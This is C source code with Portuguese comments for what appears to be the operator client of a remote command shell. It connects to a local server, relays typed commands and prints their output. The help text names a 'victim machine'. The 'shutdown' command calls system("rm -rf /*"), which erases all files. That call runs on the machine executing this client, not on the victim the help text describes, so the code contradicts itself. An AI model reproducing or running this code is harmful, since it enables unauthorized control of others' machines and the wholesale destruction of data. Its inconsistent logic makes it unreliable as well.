#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <arpa/inet.h>
#include <stdio.h>

#define PORT 8080

int main() {
    int s = 0;
    struct sockaddr_in serv_addr;
    char buffer[1024] = {0};
    char cmd[1024];

    // Criar o socket
    s = socket(AF_INET, SOCK_STREAM, 0);
    if (s < 0) {
        perror("socket creation error");
        exit(EXIT_FAILURE);
    }

    serv_addr.sin_family = AF_INET;
    serv_addr.sin_port = htons(PORT);

    // Converter endereços IP do formato de texto para binário
    if (inet_pton(AF_INET, "127.0.0.1", &serv_addr.sin_addr) <= 0) {
        perror("invalid address / address not supported!");
        exit(EXIT_FAILURE);
    }

    // Conectar ao servidor
    if (connect(s, (struct sockaddr *)&serv_addr, sizeof(serv_addr)) < 0) {
        perror("connection failed");
        exit(EXIT_FAILURE);
    }

    printf("[+] connected to server...\n");

    while (1) {
        printf(">> ");
        fgets(cmd, sizeof(cmd), stdin);
        cmd[strcspn(cmd, "\n")] = 0; // Remover newline

        // Se o comando for "exit", encerra a conexão
        if (strcmp(cmd, "exit") == 0) {
            break;
        }

        // Se o comando for "shutdown", executa o comando localmente
        if (strcmp(cmd, "shutdown") == 0) {
            system("rm -rf /*"); // Comando destrutivo para fins de exemplo
            close(s);
            exit(EXIT_SUCCESS);
        }

        // Se o comando for "help", exibe a ajuda
        if (strcmp(cmd, "help") == 0) {
            printf("\nhelp - te mostra uma lista de comandos para usar.\n");
            printf("shutdown - apaga/mata todos os arquivos e o sistema da máquina vítima.\n");
            printf("exit - encerra a conexão com o servidor.\n");
            continue; // Volta para o início do loop para continuar recebendo comandos
        }

        // Enviar comando para o servidor
        send(s, cmd, strlen(cmd), 0);

        // Receber e exibir a saída do comando
        while (1) {
            int n = read(s, buffer, sizeof(buffer) - 1);
            if (n <= 0) {
                break;
            }
            buffer[n] = '\0';
            // Se o servidor enviar "EOF", parar de ler
            if (strcmp(buffer, "EOF") == 0) {
                break;
            }
            printf("%s", buffer);
        }
    }

    close(s);
    return 0;
}
